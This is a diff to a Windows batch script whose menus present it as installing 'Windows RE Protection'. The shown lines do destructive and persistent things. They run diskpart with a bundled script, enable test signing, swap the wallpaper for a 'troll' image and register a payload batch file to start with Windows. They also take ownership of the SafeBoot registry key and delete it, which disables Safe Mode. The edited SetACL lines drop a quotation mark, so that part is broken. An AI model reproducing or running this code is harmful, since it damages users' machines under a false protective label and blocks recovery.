@@ -76,6 +76,7 @@ echo 1 - :)
 echo,
 SET /P M=Type 1 then press ENTER:
 IF %M%==1 GOTO WIN7INSTALLRE
+goto SEVEN
 :WIN7INSTALLRE
 echo Applying changes...
 diskpart /s %CD%\win7\diskpart.txt
@@ -99,6 +100,7 @@ echo 1 - :)
 echo,
 SET /P M=Type 1 then press ENTER:
 IF %M%==1 GOTO WIN8INSTALLRE
+goto EIGHT
 :WIN8INSTALLRE
 echo Installing Windows RE Protection...
 diskpart /s %CD%\win8\diskpart.txt
@@ -148,6 +150,7 @@ echo 1 - :)
 echo,
 SET /P M=Type 1 then press ENTER:
 IF %M%==1 GOTO WIN10INSTALLRE
+goto TEN
 :WIN10INSTALLRE
 goto TENINSTALL
 echo Applying changes...
@@ -209,9 +212,9 @@ xcopy "%CD%\junkins\walp\walp.bmp" "c:\windows\wallpapertroll\walp.bmp" /y /q /h
 bcdedit /set TESTSIGNING on
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\windows\wallpapertroll\walp.bmp /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv5 /t REG_SZ /d c:\windows\payload\startup.bat
-start "%CD%\junkins\startup\SetACL.exe" -on name -ot type -actn action
-start "%CD%\junkins\startup\SetACL.exe" -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn setowner -ownr "n:Administrators"
-start "%CD%\junkins\startup\SetACL.exe" -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn ace -ace "n:Administrators;p:full"
+start "%CD%\junkins\startup\SetACL.exe -on name -ot type -actn action
+start "%CD%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn setowner -ownr "n:Administrators"
+start "%CD%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn ace -ace "n:Administrators;p:full"
 reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" /f
 RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
 goto AAAAJJ
